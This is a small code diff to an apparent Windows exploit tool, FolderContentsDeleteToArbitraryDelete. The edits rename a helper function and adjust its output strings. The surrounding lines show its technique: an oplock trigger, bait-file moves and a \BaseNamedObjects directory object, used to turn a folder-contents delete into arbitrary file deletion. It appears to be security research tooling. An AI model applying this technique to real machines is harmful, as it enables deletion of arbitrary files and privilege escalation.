@@ -15,7 +15,7 @@ import offwinlib;
 
 static void print_usage()
 {
-	std::wcout << L"Usage: FolderContentsDeleteToArbitraryDelete.exe [file|folder] VULNERABLE_FOLDER TARGET_FILE_OR_FOLDER" << std::endl;
+	std::wcout << L"Usage: FolderContentsDeleteToArbitraryDelete.exe file|folder VULNERABLE_FOLDER TARGET_FILE_OR_FOLDER" << std::endl;
 }
 
 int wmain(int argc, wchar_t* argv[])
@@ -57,8 +57,8 @@ int wmain(int argc, wchar_t* argv[])
 		std::wcout << L"[+] Oplock triggered." << std::endl;
 
 		std::wcout << L"[*] Moving bait file to temp dir..." << std::endl;
-		auto new_path = owl::misc::move_file_to_temp_dir(oplock_data.handle.get());
-		std::wcout << std::format(L"[+] Bait file moved to {}...", new_path) << std::endl;
+		auto new_path = owl::misc::move_to_temp_dir(oplock_data.handle.get());
+		std::wcout << std::format(L"[+] Bait file moved to {}.", new_path) << std::endl;
 
 		auto directory_object = LR"(\BaseNamedObjects)"s;
 		std::wcout << std::format(L"[*] Creating directory object in {}...", directory_object) << std::endl;
